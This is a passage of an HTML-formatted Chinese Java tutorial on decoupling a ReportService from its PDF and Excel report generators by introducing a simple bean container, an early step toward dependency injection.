margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;generator.generate(table);&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Client&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">static</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;main(String[]&nbsp;args)&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReportService&nbsp;reportService&nbsp;=&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">new</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportService();&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;reportService.getDailyReport(<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">new</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Date());&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//reportService.getMonthlyReport(new&nbsp;Date());</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li></ol></pre>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">问题描述：</span></span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">如上面代码中的注释所示，具体的报表生成器由</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">类内部硬编码创建，由此</span><span style=\"padding:0px; margin:0px; font-size:12pt\">ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">已经<span style=\"padding:0px; margin:0px; background:yellow\">直接依赖</span>于</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;PDFGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">或</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ExcelGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">，必须消除这一明显的紧耦合关系。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">解决方案：</span></span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">引入容器</span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">引入一个中间管理者，也就是容器（</span><span style=\"padding:0px; margin:0px; font-size:12pt\">Container</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">），由其统一管理报表系统所涉及的对象（在这里是组件，我们将其称为</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Bean</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">），包括</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;ReportService&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">和各个</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;XXGenerator&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">。在这里使用一个键</span><span style=\"padding:0px; margin:0px; font-size:12pt\">-</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">&#20540;对形式的</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;HashMap&nbsp;</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">实例来保存这些</span><span style=\"padding:0px; margin:0px; font-size:12pt\">&nbsp;Bean</span><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">。</span></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">实现方法：</span></span></div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">得到类图如下：</span></div>\r\n<p align=\"left\" style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt\"></span></p>\r\n<p style=\"padding-top:0px; padding-bottom:0px; margin-top:0px; margin-bottom:0px; clear:both; height:auto; overflow:hidden; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<a target=\"_blank\" target=\"_blank\" href=\"http://img1.51cto.com/attachment/201012/212202974.jpg\" style=\"padding:0px; margin:0px; color:rgb(92,101,13); text-decoration:none\"><img border=\"0\" alt=\"\" src=\"http://img1.51cto.com/attachment/201012/212202974.jpg\" style=\"padding:0px; margin:0px; vertical-align:top; border:none\"></a></p>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n&nbsp;</div>\r\n<div align=\"left\" style=\"padding:0px; margin:0px; color:rgb(85,85,85); font-family:宋体,'Arial Narrow',arial,serif; font-size:14px; line-height:28px\">\r\n<span style=\"padding:0px; margin:0px; font-size:12pt; font-family:宋体\">代码实现：</span><span style=\"font-family:'Courier New'; font-size:12px; color:#3F7F5F; padding:0px; margin:0px\"><br style=\"padding:0px; margin:0px\">\r\n</span></div>\r\n<pre style=\"padding:0px; margin-top:0px; margin-bottom:1em; font-family:'Courier New',monospace; overflow:auto; width:710.813px; color:rgb(85,85,85); background:rgb(247,247,247)\"><ol class=\"dp-j\" style=\"padding:5px 0px; margin:0px; color:rgb(92,92,92); border-left-width:3px; border-style:none none none solid; border-left-color:rgb(20,107,0)\"><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Container&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;以键-&#20540;对形式保存各种所需组件&nbsp;Bean</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">private</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">static</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;<span style=\"padding:0px; margin:0px; border:none; background-color:rgb(255,255,0)\">Map&lt;String,&nbsp;Object&gt;&nbsp;beans</span>;&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Container()&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beans&nbsp;=&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">new</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;HashMap&lt;String,&nbsp;Object&gt;();&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;创建、保存具体的报表生起器</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReportGenerator&nbsp;reportGenerator&nbsp;=&nbsp;<span style=\"padding:0px; margin:0px\"><span style=\"padding:0px; margin:0px; border:none; background-color:rgb(255,255,0)\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); background-color:inherit\">new</span>&nbsp;PDFGenerator()</span></span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">;&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beans.put(<span class=\"string\" style=\"padding:0px; margin:0px; border:none; color:blue; background-color:inherit\">&quot;reportGenerator&quot;</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">,&nbsp;reportGenerator);&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;获取、管理&nbsp;ReportService&nbsp;的引用</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ReportService&nbsp;reportService&nbsp;=&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">new</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportService();&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;beans.put(<span class=\"string\" style=\"padding:0px; margin:0px; border:none; color:blue; background-color:inherit\">&quot;reportService&quot;</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">,&nbsp;reportService);&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">static</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;Object&nbsp;getBean(String&nbsp;id)&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">return</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;beans.get(id);&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\"><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">class</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportService&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;消除紧耦合关系，由容器取而代之</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"comment\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,130,0); background-color:inherit\">//&nbsp;private&nbsp;static&nbsp;ReportGenerator&nbsp;generator&nbsp;=&nbsp;new&nbsp;PDFGenerator();</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">private</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;ReportGenerator&nbsp;generator&nbsp;=&nbsp;(ReportGenerator)<span style=\"padding:0px; margin:0px; border:none; background-color:rgb(255,255,0)\">&nbsp;Container.getBean</span>(</span><span class=\"string\" style=\"padding:0px; margin:0px; border:none; color:blue; background-color:inherit\">&quot;reportGenerator&quot;</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">);&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;getDailyReport(Date&nbsp;date)&nbsp;{&nbsp;</span></span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;table.setDate(date);&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;generator.generate(table);&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;</span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">public</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;</span><span class=\"keyword\" style=\"padding:0px; margin:0px; border:none; color:rgb(0,102,153); font-weight:bold; background-color:inherit\">void</span><span style=\"padding:0px; margin:0px; border:none; background-color:inherit\">&nbsp;getMonthlyReport(Month&nbsp;month)&nbsp;{&nbsp;</span></span></li><li class=\"alt\" style=\"padding:0px 3px 0px 10px!important; margin-top:0px!important; margin-right:0px!important; margin-bottom:0px!important; margin-left:20px; color:inherit; line-height:1.3em; list-style:decimal-leading-zero outside; border:none\"><span style=\"padding:0px; margin:0px; border:none; color:black; background-color:inherit\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;table.setMonth(month);&nbsp;</span></li><li style=\"margin-left:20px; line-height:1.3em; list-style:decimal-leading-zero outside; border:none; padding:0px 3px 0px 10px!important; margin-top:0px!important; 